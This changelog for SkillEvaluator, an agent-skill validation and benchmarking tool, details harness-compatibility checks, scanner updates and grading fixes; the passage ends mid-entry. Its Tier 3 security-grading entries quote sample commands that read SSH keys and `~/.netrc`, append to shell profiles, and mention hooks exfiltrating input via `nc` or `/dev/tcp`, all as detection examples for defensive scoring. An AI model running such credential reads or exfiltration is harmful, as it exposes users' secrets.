# Changelog

All notable changes to SkillEvaluator are documented in this file.

## Unreleased

### Added

- Canonical `comment-skill-checks.yml` reusable workflow and source template for
  the standard scored Tier 1 PR comment without hosted reports. It verifies the
  existing signed receipts and native evidence, reuses the shared report and
  comment helpers, and needs no Pages configuration or history branch. Future
  generated bundles include the template; archived bundles and the released
  onboarding CLI retain their existing hosted publisher setup.
- Each `harness` rule records a confidence level and, where behaviour changed
  between releases, the versions it applies to (shown with `-v`). `harness-check
  --harness-version codex=0.170.0` adds a note when you run a release other than
  the one a profile was verified on.
- `harness-check` takes the model setup some limits depend on: `--context-tokens`,
  `--custom-provider`, `--explicit-invocation` and `--headless` (a Claude Code
  skill with `allowed-tools` does not load headless).
- Plugin component rules: skill namespacing, Codex's plugin-skill cap and Agent
  Plugins hooks, Copilot CLI MCP server names, disabled plugins, and components a
  harness does not deliver.
- `harness-check` on a plugin folder shows which plugin formats each harness
  accepts (`.claude-plugin`, `.codex-plugin`, Copilot, Agent Plugins v1, Hermes
  `plugin.yaml`) and flags an empty plugin.
- `harness` rules for harness gates: Hermes `platforms` and OpenClaw
  `metadata.openclaw.requires`.
- `harness` rules for invocation fields: `disable-model-invocation`, Codex's
  `agents/openai.yaml` policy, `allowed-tools`, Claude Code-only fields and Hermes
  project trust. Tier 1 `schema` now reports fields outside the agentskills.io
  spec (LOW).
- `harness` rules for placeholders: price-like `$N` text that Claude Code and
  OpenCode replace with arguments (with line numbers), and `$ARGUMENTS` and
  `${CLAUDE_SKILL_DIR}`, which only Claude Code substitutes.
- `harness` rules for delivery limits: Claude Code's body cap, OpenCode's
  51,200-byte / 2,000-line reads and long lines, OpenClaw's whole-read and
  weighted result caps, Hermes's 100,000-character `skill_view` budget and Codex's
  ~10K-token shell-output cut. Tier 1 `schema` now reports `SKILL.md` size tiers
  (32 KiB LOW, 50 KiB MEDIUM, 256,000 bytes HIGH).
- The `harness` check measures a skill together with the skills installed beside
  it: list budgets (scaled by the context window), duplicate names and which copy
  each harness uses, and OpenClaw's prompt cap and compact list. A `catalog` line
  in the panel names the folder measured. Skills in separate folders are measured
  separately, and Copilot CLI and OpenCode get an advisory reload note.
- `harness` rules for where `SKILL.md` lives: casing, nested manifests, symlinked
  manifests and resources, OpenClaw symlink escapes, Codex scan depth, and files
  Hermes leaves out of its file list. Tier 1 `schema` now reports a symlinked or
  nested `SKILL.md` (MEDIUM), and the `skill.md` naming finding explains the
  macOS/Linux difference.
- `harness` rules for descriptions: missing or empty descriptions, Claude Code and
  Codex listing cuts, Copilot CLI's 1,024 UTF-16 unit limit, quotes escaped in the
  Copilot CLI and OpenClaw lists, and Hermes's 60-character listing; `-v` shows
  the description each harness lists. Tier 1 `schema` now reports a description
  over 1,024 UTF-16 units (MEDIUM) and no "Use when ..." trigger in its first 60
  characters (LOW).
- `harness` rules for frontmatter parsing: duplicate keys and tab indentation
  (strict YAML parsers drop the skill), a UTF-8 BOM (Codex), no front matter
  (Copilot CLI) and long custom frontmatter that never reaches the model. Tier 1
  `schema` now reports duplicate frontmatter keys (HIGH) and a UTF-8 BOM (MEDIUM).
- New `skillevaluator harness-check <skill>` command and a "Harness compatibility"
  panel after the Tier 1 results of `validate`: one line per harness with its most
  serious finding and an outcome label (`not found`, `rejected`, `listing
  shortened`, ...), then `+N more` and the note count; `-v` shows every finding
  with its fix. The checks line shows `! harness`, Tier 1 gets a `harness` summary
  line, and the result box names the harnesses that won't load the skill.
  `harness-check` always exits 0; `--json PATH` writes the block.
- New advisory Tier 1 `harness` check: for each agent harness (`claude-code`,
  `codex`, `copilot-cli`, `hermes`, `openclaw`, `opencode`) it reports whether the
  skill `loads`, is `degraded` or is `not_loaded`, from versioned profiles shipped
  with the package. It runs by default, never fails the run, lists its findings in
  every report and adds a `harness_compatibility` block to JSON. `--harness
  codex,claude-code` narrows the harnesses and `--harness-profiles DIR` loads
  profiles from a directory. The first rules flag a skill installed outside the
  folders a harness scans.
- A separate four-case synthetic grader pilot adds forbidden-startup-write and
  root-search challenges with quoted/read-only and scoped controls, an independent
  label worksheet, content/source manifest and explicit security/Efficiency
  availability policy. Task Overall failures remain independent of composite
  scores. This diagnostic pilot establishes no all-metrics qualification,
  statistical representativeness, release approval or Jira acceptance;
  independent automated review is pending.
- Experimental `tier3 evaluate --backend nemo-gym` targets a native Gym task-folder
  interface. Public `nemo-gym==0.7.0` is incompatible; public source candidate
  `NVIDIA-NeMo/Gym@792fa142f58277aecff05d402061d647e9a92acf` exposes the required
  `TARGET` help interface but still needs independent native runtime qualification.
  CLI compatibility is checked before dataset generation or task staging, with bounded combined help output and process-group cleanup on timeout,
  interruption or overflow. Doctor no longer treats an installed version as runtime readiness.
  Live Codex, Claude Code and OpenCode support remains unverified. The adapter's
  intended contract runs the Tier 3 cases on NeMo Gym instead
  of Harbor (`--backend harbor`, the default, is unchanged). The same
  `evals.json` cases are generated as task folders, and NeMo Gym's own
  orchestrator, agent harness (Codex, Claude Code, OpenCode) and Docker sandbox
  run them with the SkillEvaluator verifier. Its rollouts are written back as
  the usual trial results, so scores, lift, reports and `result.json` are
  shared; `result.json` records `execution_backend` with the NeMo Gym version.
  Gym runs as a separate pinned process (`SKILL_EVAL_NEMO_GYM_BIN`) because it
  needs Python 3.13.14 or later. Options the backend cannot honor (other
  environment modes, `--harbor-keep-jobs`, `--stop-on-pass`, ...)
  are rejected before anything runs, with no fallback to Harbor.
  `--timeout-multiplier`, `--copy-repo`, `harbor.agent_workdir` and
  `harbor.pre_agent_setup`, `skill_workspace.decoy_manifest` and
  `--custom-dockerfile-mode preserve`, `harbor.base_image_mode` and native
  `evals/harbor/` tasks work as on Harbor, and
  `tier3 doctor --backend nemo-gym` checks Gym readiness. When a Gym process group
  cannot be confirmed stopped after a timeout or interruption, no further arm starts
  beside it and the failure is reported. After a timeout, the failed run still keeps
  the scores of the arms that finished.

- Tier 1 **Incomplete referenced artifact analysis (AE1)** findings from
  SkillSpector now say why SkillSpector stopped inspecting the file that a skill
  names. The suggestion names the file, its disposition and each reason
  SkillSpector gives, such as
  `static_parse_limit (static_patterns_tool_misuse)`, with any line and limits,
  and the finding's metadata records them under `skillspector_evidence` and
  `skillspector_occurrences`. The suggestion leaves out the run time and the
  time budget (`observed_seconds`, `limit_seconds`), which differ from run to
  run, so a finding keeps its `finding_id` from run to run; because the
  suggestion text is new, each AE1 `finding_id` changes once with this release.
  Before, the finding said only
  `Referenced artifact was not completely inspected`, and its reason had to be
  matched by hand against the incomplete-analysis error, which lists at most
  three rows. With SkillSpector before v2.12.0 the finding was
  titled `Unknown (AE1)` and told the user to make the file available although
  SkillSpector had read part of it. It now carries the rule's name and the
  reasons from the report's ledger rows for the file. Its check name, and so its
  SARIF rule ID, changes: a `severity_overrides` entry keyed on
  `SECURITY.Unknown (AE1)` must now use
  `SECURITY.Incomplete referenced artifact analysis (AE1)`. The JSON field
  `skillspector_reference_summary` counts the files and the lines that name them
  for every result, and a failed check shows the counts in one line of the
  terminal, Markdown and HTML reports. Severities and scan completeness are
  unchanged; a gate changes only where an override of `SECURITY.Unknown (AE1)`
  was what let the check pass.

- Tier 3 `validate-grader --qualification-policy FILE` supports explicit,
  assessment-only metric/class/category coverage and risk limits, provider-free
  preflight checks, retained not-run receipts for insufficient labels, final
  policy decisions and tracked verifier-source Git provenance. Correct expected
  abstentions demonstrate category coverage without supplying binary scored
  cases; evaluated report scope must match its selected assessment cases. The
  experimental example is opt-in and fails bundled-suite class coverage; it establishes no
  live reliability or release approval. Resource comparison metadata and HTML
  also explain that observed consumption includes task failures, lower usage
  alone does not establish better Efficiency or quality, pairing does not certify
  equal concurrency/budget or judge-model agreement, and reused telemetry is
  historical. Scoring, raw deltas and reuse eligibility are unchanged.

### Changed

- The HTTP 404 message for an unavailable LLM model now says the provider's default
  may not be callable with the key and points to `SKILL_EVAL_LLM_MODEL` (`llm-model`
  in the reusable workflow); `ci/README.md` notes the same.
- Update the managed SkillSpector scanner and Tier 1 CI image from 2.13.3 to
  the latest release, 2.13.4, with matching verified wheel and source hashes.
  This fixes false LP1 findings for scoped `allowed-tools` grants and improves
  recovery of malformed LLM responses. SkillSpector 2.13.4 can still report
  JSON files containing a `timeout` key as partial analysis; those scans
  remain incomplete rather than being treated as successful.

- The rubric judge's reference supplement budget is configurable through
  `SKILLEVALUATOR_RUBRIC_SUPPLEMENT_BYTES` and defaults to one mebibyte instead
  of 30,000 bytes, which a real linked guide graph outgrows. Required linked
  Markdown is bounded only by that budget, so a guide larger than an optional
  preview is collected whole; optional script and reference previews keep their
  own small per-file bound. The budget decides how many bytes of the skill's own
  guidance are collected, never which paths may be read: every reference is still
  confined to the skill's declared root by the same secure reader, and guidance
  that does not fit still stops the evaluation with an explicit unsafe-input
  finding rather than being dropped from the judge's prompt.

- The `default` policy no longer blocks a skill for its author attribution,
  because the Agent Skills baseline requires only `name` and `description`
  (#43). A missing `metadata.author` is now a LOW advisory, and a person, team,
  or organization name without an email (such as `NVIDIA cuOpt Team` or
  `Jane Doe (@jdoe)`) passes as an INFO `SCHEMA.author_without_email` finding.
  A malformed or unsafe value still fails `SCHEMA.author_format` at HIGH: a bare
  email or an email outside `Name <email@host>`, stray angle brackets, control
  or invisible formatting characters, no letters or digits, or more than 256
  characters. A policy with an `author_email_regex` still needs an email in
  that domain. Overlays on `default` that relied on the old HIGH author
  severities should set `SCHEMA.author_missing: high` and
  `SCHEMA.author_without_email: high`, or use `--profile registry`. The policy
  digest changes for every profile because it now includes
  `metadata_id_requirement`.
- Add the bundled `registry` profile (`--profile registry`) for registries with
  a publication contract. It requires `metadata.author` in
  `Name <email@host>` form and a valid `metadata.id`.
- Validate an optional `metadata.id` as an exact 1-64 character lowercase
  ASCII slug. A policy sets `identity.metadata_id_requirement` to `ignore`
  (the default), `recommend`, or `require`; an unknown value is an error. A
  collection run reports an ID declared by more than one skill, and `validate`
  on a catalog lists these in `catalog-summary.json` under
  `metadata_id_conflicts` (each sharing skill fails under `require`). Invalid and
  duplicate IDs are MEDIUM advisories unless the requirement is `require`, and
  the ID does not change local catalog identity. JSON reports include the
  active requirement under `policy.metadata_id_requirement`.
- Install Bandit with the base package, so `pip install skillevaluator` or
  `uv tool install skillevaluator` runs every default Tier 1 check without an
  extra. pip-audit, used only by the opt-in dependency audit
  (`--check dependency`), stays in the `security` extra. The Bandit install hint
  now says to reinstall SkillEvaluator.
- Install uv with the base package, so a plain `pip install skillevaluator` on
  a machine without uv can run the Tier 1 security check. Before, that run
  ended `INCOMPLETE` with "skillspector not installed", because the pinned,
  checksum-verified SkillSpector wheel is only run through `uv tool run`. A uv
  on `PATH` or an installed `skillspector` matching the pinned release is still
  used first, and SkillSpector stays out of SkillEvaluator's own dependencies. The public
  Docker image gains the same behavior: with network access its Tier 1 run now
  completes instead of ending `INCOMPLETE`.
- Root help shows the SkillEvaluator wordmark in more terminals: the
  one-line wordmark still needs 115 columns, 76-114 columns now get the same
  letters stacked (SKILL over EVALUATOR), and 60-75 columns get a two-row
  wordmark. Narrower terminals keep the plain title. A wordmark that the
  terminal's output encoding cannot print is skipped: gbk and big5hkscs lack
  the half blocks of the two-row one, so they get the plain title at 60-75
  columns.

### Documentation

- `THIRD_PARTY_NOTICES.md` lists Bandit under the base dependencies. It has
  been installed with the base package since it moved out of the `security`
  extra, but the notice still sat in the Security row, which now lists
  pip-audit only.
- The README opens with a three-column **Get started** section: run the CLI
  directly (`pip install skillevaluator`, then
  `skillevaluator validate ./my-skill --tiers 1`), add checks to your repository
  with `skillevaluator ci init` or a CI template, or install the agent skill with
  `npx skills add NVIDIA/SkillEvaluator`.

- A new Metrics Reference page defines every number the CLI, HTML report, JSON
  report and `BENCHMARK.md` show: the six Tier 3 evaluator signals, the five
  dimensions, the Overall Score, Skill Lift, pass@k and the Tier 1 Quality
  Score. Each entry gives what the number measures, its formula as the source
  implements it, its range and units, the deterministic checks or LLM judges
  that produce its input data, and the JSON keys needed to recompute it. It
  marks which values carry LLM judge variance, describes the pass-rate Wilson
  intervals, `validate-grader`, the dataset-sufficiency label and the opt-in
  judge character facts, and states that no inter-rater agreement study against
  human-labeled trajectories has been published. Tier 1 validation, Tier 3 live
  evaluation and the reports page link to it. A regression test parses the
  constants, thresholds, weights and deduction sizes out of the page and
  asserts them against the live values in `constants.py`,
  `tier3/dataset_sufficiency.py`, the default quality config and the bundled
  grader suite, so retuning any of them fails CI instead of rotting the page.

### Fixed

- Automatic SkillSpector selection now verifies the pinned release on first use
  and falls back to the verified managed wheel for a different or unverifiable
  version. Discovery stays free of subprocesses, version probes omit provider
  credentials and respect the caller timeout, and explicit executable overrides
  remain available. Doctor reports the path and source selected by the probe.
- `health-check --tier 1` (and `doctor --tier 1`) labels a scanner that
  SkillEvaluator provisions itself: `(uv tool run)` for SkillSpector and
  `(managed)` for the downloaded Gitleaks binary. Before, the Gitleaks row
  ended in `(from None)` and the SkillSpector row named
  `SKILLEVALUATOR_SKILLSPECTOR_PATH` although no override was set.
- The comments-only consumer template now grants its required read and PR-comment
  permissions only to the comment job, with no workflow-wide token permissions.
- The behavior evidence gate no longer keeps a score for an expectation that
  names an observed artifact but also asks for something only the final answer
  could show. "Writes `report.py` and explains why each column was dropped" was
  treated as settled by the artifact alone, so a case kept a score whose second
  half was never checked. Every clause of an expectation must now name a
  checkable artifact of its own; one that does not keeps the gate, as a wholly
  prose expectation already did.
- SARIF `artifactLocation.uri` values percent-encode a `%` in a file name as
  `%25`. A file such as `a%20b.md` no longer shares the URI of `a b.md`, and
  `100%.md` no longer produces an invalid URI.
- Reports no longer fail on Linux when a skill file name is not valid UTF-8
  (#525). Finding IDs, HTML issue keys, the written HTML, JSON, Markdown and
  SARIF reports, the CI workflow scripts that re-render retained reports, and
  generated `evals/evals.json` datasets accept the surrogate-escaped name
  Python gives such a file. The SARIF `artifactLocation.uri` percent-encodes
  the name's original bytes (`caf%E9.md`).
- SARIF `artifactLocation.uri` values stay valid for more paths. A
  repository-relative path whose first segment contains a colon, such as
  `notes:v2.md`, gets a `./` prefix so it no longer reads as a URI scheme. A
  path outside the workspace is written as an absolute `file:` URI instead of
  a bare file system path, and a symlink in the workspace that points outside
  it keeps the link's repository-relative path.
- Accuracy and Behavior judge prompts clarify that explicit final-answer formats
  apply to the entire final response, independently of correct values in tool
  output or references. Scoring and thresholds are unchanged; an Accuracy format
  failure alone can still score 0.8 and pass the default threshold.

- An author value is no longer rejected for containing a Unicode joiner. The
  character guard matched all of category `C`, so ZWNJ (U+200C) and ZWJ
  (U+200D), which Persian, Arabic and Devanagari names need to render, plus a
  soft hyphen and any code point unassigned in the running interpreter's
  Unicode data, all failed `SCHEMA.author_format` at HIGH under both bundled
  profiles. The guard now rejects controls, surrogates and private-use code
  points plus the bidirectional marks, embeddings, overrides, isolates and the
  byte-order mark, and its message says so. An unassigned code point no longer
  makes the verdict depend on the interpreter's Unicode version.
- A bare email address whose domain has no dot, such as `root@buildhost`, is
  reported as a malformed author rather than as "Author has no email address".
  The bare-email pattern required a dotted domain, so an intranet address took
  the plain-attribution path. The discriminator is now a word character on each
  side of the `@`, which still leaves a social handle such as
  `Jane Doe (@jdoe)`, a bare `@jdoe` or `Platform Team @ Example` alone, and
  now also catches a non-ASCII local part.
- An advisory carried from a passing skill into a collection result now names
  the skill it came from, in its location and in `metadata.collection_skill`.
  The findings were preserved but attributed to nothing, so a collection run
  could not say which member produced one. The per-skill roll-up also stops
  reporting "All schema and structure checks passed" next to a list of that
  skill's advisories.
- A `catalog-summary.json` entry lists the catalog-wide findings behind its
  verdict under `catalog_findings`. The duplicate `metadata.id` check already
  failed the member and bumped its `severity_counts`, but a catalog validates
  each skill on its own, so nothing in that skill's output said what caused
  either.
- Folder validation preserves author and metadata ID advisories from passing
  skills. Catalog summaries include duplicate ID severity counts and consistent
  member verdicts, while explicitly labeling linked reports as single-skill
  results and retaining their independent verdicts.
- Behavior checks no longer score a final answer that the evidence limits
  shortened. The final-response allowance rises from 800 to 8,000 characters
  and the default behavior evidence budget from 8,000 to 12,000, so an ordinary
  answer reaches the judge whole instead of losing its middle; the user request
  keeps a reserved section of up to 2,000 characters ahead of the optional
  exploration output in the compact tool history, which also repeats the
  request at its head. The `behavior_check` evidence record now reports whether
  the required evidence is complete, and which sections are incomplete, not
  only whether something was dropped. When the final answer still cannot fit
  and the deterministic verified facts do not already settle every expected
  behavior, the judge returns an explicit evaluation error and no behavior
  score, rather than grading the evidence loss as a behavior failure.
  **That case then has no overall score at all**: an unscored metric that is
  not "not applicable" leaves `overall_score` null, so such cases drop out of
  any gate or comparison keyed on it until the limits are raised or the case is
  shortened. A case whose expected behaviors are all confirmed by the verified
  facts keeps its score, because the missing text cannot change the outcome.
  `SKILL_EVAL_BEHAVIOR_FINAL_RESPONSE_LIMIT` and
  `SKILL_EVAL_BEHAVIOR_CHECK_BUDGET` are both honoured exactly as set, in
  either direction. Note that the final-response limit also caps the reserved
  user-request section when it is set below 2,000, and that a check budget too
  small to hold the final response beside some tool history is logged as a
  warning rather than quietly raised — lower the final-response limit with it.
- Code Risk Analysis reports Semgrep file-level parse errors as one partial-scan
  error that names up to 20 unparsed files, relative to the skill and with the
  line of the first error, instead of the first three truncated messages. The
  check stays `incomplete` because Semgrep skips the code it cannot parse. The
  JSON report lists the files in `semgrep_unparsed_files` (up to 1,000, with
  `semgrep_unparsed_files_omitted` counting the rest); other Semgrep errors are
  reported as before.
- The supporting Tier 3 Pass@k table displays an unavailable or skipped
  baseline rate as `N/A`, preserving an observed baseline rate of `0%`.
- Tier 3 budget summaries disclose measured usage above configured limits,
  including after the final admitted attempt, and identify incomplete usage.
  Additive `budget.observed_overruns` metadata is separate from admission
  `status`; limits are checked between logical admission units, so a completed
  run can exceed a cap without becoming partial or failed.
- Grader qualification reports null behavior-step results with a matching
  `not_checked` expectation as insufficient evidence instead of errors. Raw
  scores and unjudgeable rates are unchanged.
- Tier 3 token usage rows are now validated against the evaluation dataset's own
  case IDs. Every case row uses one of those IDs at most once, and an attempt
  whose only name is Harbor's 32-character cut of a case name is attributed to
  that case, so missing telemetry stays with the canonical case instead of
  splitting into a row of its own. A row that still cannot be matched is marked
  as an unverified case ID in every report and recorded under
  `token_usage.case_id_validation`, rather than being shown as coverage of a
  dataset case; a table that shows no such row, because it renders no case rows
  or its row caps dropped them, names the unmatched case IDs instead. Hidden
  case names receive the same Markdown escaping, publication-label masking and
  terminal secret redaction as visible rows, before their displayed length is
  bounded.
- The Tier 3 security scan no longer scores an agent clearing its own output
  directory as a destructive command. One literal, recursive and forced `rm` of
  a path inside `/workspace/output` or an output directory established by the
  trusted staged runtime configuration is cleanup. A tool call's first or
  later `cwd`/`workdir` and shell directory changes cannot establish another
  owned root. The directory itself, sensitive or protected paths, compound,
  globbed, parent-escaping or dynamic forms retain conservative scoring.
  After observed symlink creation, only an unadorned direct leaf can qualify;
  unknown command directories cannot qualify. Literal quoting is inert
  because expansions and escapes are rejected before operands are parsed.
- The Tier 3 security scan no longer reads the license URL in a source file's
  copyright header as data exfiltration. A `http://` or `https://` URL on a
  comment line of a license or copyright notice is prose within recognized
  shell comments and bounded, simple literal file-write actions (`cat`, `tee`
  or `apply_patch` heredocs). Expanding shell strings and heredocs cannot claim
  an inert notice context. Other URLs, including docstring links, and mixed or
  uncertain shell actions retain conservative oversized-action handling. A
  curl, wget or httpie word keeps its meaning wherever it appears, including
  inside a notice; executable shell leaders cannot borrow a notice either.
- A failed Tier 3 execution (for example a backend launch failure) now marks the
  report payload, its summary and the affected agents as failed with their
  errors, instead of only the top-level `result.json`. A report re-rendered by
  `tier3 view` reads the status from the run's `result.json`. Scores from the
  completed trials are kept.
- Skill activation now credits a SKILL.md read wrapped in a shell, such as
  `/bin/bash -lc 'cat skills/x/SKILL.md'`, which some agent harnesses record
  instead of the bare command. Searches inside a wrapper (`bash -c 'grep SKILL
  config.json'`) are still not counted.
- Tier 3 reads the native Codex wrapper that runs a literal command array
  through `.map`, so a skill read batched that way is graded instead of scoring
  as an unsupported wrapper. The decoder stays a bounded static one: every array
  element is still a literal, the callback may only hand that element to one
  named tool, and a reused or shadowed binding, a changed index or payload, a
  computed key or tool name, or a duplicate, missing, extra, reordered or
  truncated result record leaves the whole wrapper unsupported. Each command is
  matched to the settled result at its own position and carries that result's
  own exit code or rejection. The form that prints inside the callback settles
  out of array order, so it is read only for a single command and otherwise
  stops grading rather than guessing which result belongs to which command.
  That inline form is graded only on evidence it actually produced: the callback
  must `await` the call, because an un-awaited one prints a pending promise
  rather than the tool's result, and it must print something, because
  `Promise.allSettled` swallows a rejection and would otherwise let a call that
  never ran exit cleanly and read as a successful command.

- A Tier 1 security scan keeps a SkillSpector `partial` report `INCOMPLETE` when
  its only ledger row is a referenced image but its `references` list records a
  `missing` reference on a line without a ledger row, an `ambiguous` reference,
  or a list flagged as truncated with a key that ends in `_truncated`, such as
  `ledger_exceptions_truncated`. Such a report no longer passes with the image
  warning alone, because nothing reads the line of that reference for a file
  left out of the scanned copy.

- `validate` Tier 1 output: when only the `--llm` / `--llm-verify` stage
  can't run, `what to fix` gives the exact `export` lines for the missing
  provider or key instead of a scanner install or `--skip security`, and the
  scanners row keeps the scanner version (`SkillSpector 2.12.0, LLM didn't
  run`). A missing SkillSpector or a rejected baseline under `--llm` still
  gets the scanner fix, and a `SKILLSPECTOR_PROVIDER` adapter set directly
  gets advice for its own key instead of the public provider's. The summary
  row now also gives the sub-check count (`9/10 checks passed (22
  sub-checks)`). It counts validators, as the `Tier 1: 9 of 10 checks passed`
  verdict line under it does, so the two agree, including with `--skip` and
  `--fail-fast`.

- A Tier 1 security scan with SkillSpector v2.12.0 or later no longer stops as
  `INCOMPLETE` ("Security Scan didn't run") with
  `hooks/hooks.json [static; opaque_content; analyzers=bundled_execution_surface]`
  when the scanned skill, folder or hooks-only plugin has an ordinary command
  or HTTP hook, one SkillSpector does not report as sending hook content to a
  remote host (BH2). SkillSpector cannot model what such a hook does with its
  input, so it reports the analysis as `partial` although the scan finished,
  and its findings cannot show that the hook is safe: a hook script that sends
  its input over a socket, `nc` or `/dev/tcp` gets no blocking finding. The
  scan now fails with the Critical `skillspector_hook_payload_unverified`,
  which names the manifest, such as `hooks/hooks.json` or
  `.claude/settings.json`, and a gate failure that neither a `--policy`
  severity override nor `--llm-verify` clears. Only removing the hooks passes
  the check. The other findings and the `--llm` stage are reported as for any
  complete scan, and a folder scan goes on to the next skill. This applies
  only to SkillSpector's nonfatal, whole-file row on a manifest whose BH1
  finding says its hook payload is `unmodeled`, also under a baseline, and
  only when the report accounts for the row exactly. This covers only
  manifests and hook evidence the scanner reports, without claiming coverage
  for inline plugin-manifest hooks or other unreported hook locations.
  SkillSpector records the same row for a manifest it read only in part:
  with v2.13.4, whose row counts
  the records it read, a manifest with a record that is not a parsed hook
  declaration, such as a skipped handler or a permission rule, stays
  `INCOMPLETE`; with v2.13.3, only a BH1 with 2,048 or more declarations does,
  and a partly parsed manifest gets the Critical. The rest of the report is
  judged as before: missing references and referenced images are still
  accepted with their warnings under the rules above; the v2.13.3 missing-path
  reference caveat that is accepted from the report alone does not apply
  beside the hooks, because it reads the whole report. Any gap those rules do
  not accept, such as a missing reference in a scan without a known target or
  in a skill that `validate` or `security-scan` checks on its own inside a
  folder or plugin, still records the SkillSpector scan as incomplete
  (`incomplete_scans` in the JSON report, and publication eligibility
  `Incomplete`), with an error that names only that gap. The check itself is
  reported as `FAIL`, not `INCOMPLETE`, because the Critical is a confirmed
  failure. With SkillSpector v2.13.4, a hook with a `"timeout"` key also gets
  a `static_parse_limit` row on the manifest, so that scan is recorded as
  incomplete in the same way.

- `validate` no longer repeats its header box in short terminal windows or
  when a log warning prints mid-run. Only the tier that is still running is
  redrawn; the header and finished tiers print once, and log records print
  through the live view's console. The progress line now prints once, above
  the final verdict.
- Tier 3 security grading now handles more cases, on top of the 0.9.0
  home-directory spellings fix. A home path in the default word of a
  `${VAR:-word}` or `${VAR-word}` that starts a path word now matches, so
  `cat "${SSH_KEY:-$HOME/.ssh/id_rsa}"` and
  `echo x >> "${GIT_CONFIG:-$HOME/.gitconfig}"` score Security 0.0 (1.0 in
  0.9.0), while `cat backup-$HOME/.netrc` and
  `cat backup-${X:-$HOME/.netrc}` keep 1.0. The quoted strings that
  bound a redirection, `tee`, or `sed -i` target are found as the shell finds
  them: an escaped `\'` opens none, a quote in a `#` comment pairs only
  within its line, and one in a here-document body never pairs past the
  body. So after `# Show what's in the profile`, the read
  `echo '--> zprofile'; cat ~/.zprofile; echo '--> done'` now scores 1.0
  (0.0 in 0.9.0), and `sed -i '/old-path/d' $HOME/.zprofile` scores 0.0
  (1.0 in 0.9.0). A redirection, `tee`, or `sed` inside a quoted string or a
  comment no longer hides the writes after it, so
  `echo "Step 1 -> check"; echo x >> "$HOME/.zprofile"` scores 0.0. The
  `view` command of `str_replace_editor` or `str_replace_based_edit_tool` is
  checked as a read, like a `Read`: a view of `/root/.gitconfig`,
  `/root/.bashrc`, or `/etc/sudoers` scored 0.0 in 0.9.0 and now scores 1.0,
  and a view of a credential store such as `~/.netrc` still scores 0.0. Both
  the host checker and the bundled Harbor verifier apply the fix.
- `BENCHMARK.md` now shows the evidence and the policy that decided its overall
  verdict. The card used to print `Overall verdict: PASS — Recommended for
  publication` with nothing behind it, so a reader who saw an agent with no
  dimension scores and another agent below the documented 40% FAIL boundary had
  no way to tell why the gate still passed. A "Why This Verdict" block under the
  callout now names the rule that fired, the Tier 3 evidence state with its
  publication policy, each blocking reason, and, per agent, what the dimension
  gate read: which agent passed every dimension, which dimension fell below the
  FAIL or PASS boundary, and which agent the gate did not count, naming the
  excluded arm when the run recorded one. A PASS that rests on one agent while
  another fails a dimension now says so. The block is rendered from the same
  publication assessment the printed verdict is projected from, and from the
  per-agent breakdown the Tier 3 dimension verdict folds, so it cannot describe
  a different decision. Optional or skipped Tier 3 runs are explained using
  their recorded policy, and threshold-adjacent scores retain enough precision
  to stay in their actual verdict band. No verdict changes.
- `--tolerate-baseline-timeouts` (added in 0.9.0) now follows its own rules
  in the printed run verdict, in the notes of both reports and during result
  collection. The `RUN QUALITY VERDICT` line that `tier3 evaluate` prints
  reads the same agents as the run verdict, so a tolerated agent that passes
  no longer prints PASS beside a complete agent that fails or never
  activated the skill; the line now reads FAIL or INCONCLUSIVE, as the
  reports do. `BENCHMARK.md` and `report.html` now keep the "Needs
  attention" note and the `Baseline incomplete` line for each tolerated
  agent also when a cost limit leaves the best agent's attempts short; both
  reports used to leave them out in that case. `report.html` also keeps the
  note when its overview reads Inconclusive because the complete agent never
  activated the skill. An output-token count past the JSON-safe integer
  range (above 2^53 - 1) in a timed-out attempt is no longer progress
  evidence; with no other in-range count for that attempt the agent is
  refused as `no_progress_evidence`, where result collection used to stop
  with `browser-unsafe JSON integer` and write no `result.json` or report.

- A native Codex `exec` wrapper that calls the freeform `apply_patch` tool with
  the patch as a bare string is decoded instead of being discarded. The bounded
  statement grammar read every argument as an object literal, so
  `const r1 = await tools.apply_patch("*** Begin Patch\n...");` followed by
  another call made the whole wrapper
  `unsupported_native_codex_exec_wrapper`: the patch and its sibling calls went
  ungraded, although the same wrapper written as
  `tools.apply_patch({input: "..."})` decoded. A single- or double-quoted
  string is now read as that tool's `input`. Nothing is interpreted: a template
  literal, a concatenation, an extra argument, an unterminated string and a
  bare string passed to any other tool are still rejected, and the object path
  keeps its character gates unchanged.
- A tool call the harness reports as exiting 0 is no longer recorded as failed
  because its output holds error words. An agent that read a document *about*
  errors, such as a `SKILL.md` headed `# Troubleshooting: command not found`,
  lost that call's component activation in the plugin component signals. An
  explicit zero exit status in every correlated result's header now passes the
  call, as a harness success flag already did. Only the harness's own header
  lines are read, so a body that spells `exit_code=0` still reports nothing,
  and a result with no exit status, or a non-zero one, is judged by its text
  exactly as before.
- Add `SKILL_EVAL_LLM_REFUSAL_FALLBACK_MODEL` to set the model that Claude 5.5
  or later requests name as the server-side refusal fallback, or to turn it off
  with `none`, `off`, `disabled`, `false` or `0`. The Claude API answers HTTP
  400 (`'claude-opus-4-8' is not a valid fallback target for
  'claude-sonnet-5-5'`) when the fixed `claude-opus-4-8` target does not suit
  the request model, which made such a model unusable for LLM checks and as a
  Tier 3 judge. A fallback equal to the request model is no longer sent. The
  default is unchanged. The Harbor verifier receives the variable like
  `LLM_JUDGE_FALLBACK_MODELS`; its Bedrock refusal retry uses it too, adding
  the judge model's geography prefix to a bare name and using a full Bedrock
  ID as given. The reusable CI workflows do not take the variable.

- When the default report directory cannot be claimed, the error now gives
  the reason and the way out: `Cannot safely reserve default report output
  directory: <dir> (<reason>). Choose a report directory with
  -o/--output-dir.` Before, it named only the directory. This happens when
  both `reports/` and `<skill>-reports/` hold files written under another
  ownership key, for example from containers that each start with a fresh
  home directory. The refusal itself is unchanged, and `docs/reports.mdx`
  explains it.
- `validate path/to/SKILL.md` and `validate path/to/workflow-rules.mdc` now
  validate the folder that holds the file, as passing the folder does, so a
  file inside a symlinked folder is now refused unless `--no-dedup` is passed,
  as that folder is. Before, Tier 1 and Tier 2 received the file itself:
  `schema`, `version` and `quality` failed with `No skills found` for a skill,
  and `schema` with `No workflow directories found` for a workflow; a run
  narrowed with `--checks` could pass without scanning the skill's other files;
  and a run from inside the skill wrote its reports into it.

## 0.9.0 - 2026-11-13

### Fixed

- Tier 3 dataset fairness validation checks the skill's own identities and
  nested judge expectations, recognizes required reads after negated actions,
  and bounds diagnostics and repeated-negation work. Template prompts avoid
  requiring bundled scripts; upgrade guidance explains strict CI preflight
  failures for older datasets that grade skill use.

### Added

- Dataset fairness validation checks the evaluated skill's own names and nested
  graded text, distinguishes negated reads from required reads, and bounds
  warning excerpts and repeated-match scanning. Common Unicode, Markdown and
